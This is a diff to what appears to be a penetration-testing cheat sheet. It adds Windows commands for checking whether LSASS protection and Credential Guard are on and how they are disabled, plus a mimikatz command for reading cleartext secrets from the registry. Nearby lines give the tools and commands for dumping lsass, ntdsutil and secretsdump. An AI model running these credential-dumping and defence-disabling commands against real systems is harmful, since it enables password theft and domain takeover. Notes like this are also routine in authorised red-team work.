@@ -268,6 +268,15 @@ PrivEsc
         minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
     Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
     
+  Check for LSA Protection (Protected LSASS)
+    shell reg query "hklm\system\currentcontrolset\control\lsa" 
+      RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
+      LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
+  
+  Mimikatz
+    lsadump::secrets (Only SYSTEM can read)
+      Clear Text Passwords from Registry: HKEY_LOCAL_MACHINE/Security/Policy/Secrets
+  
   Dump DC NTDS.dit
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
     /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
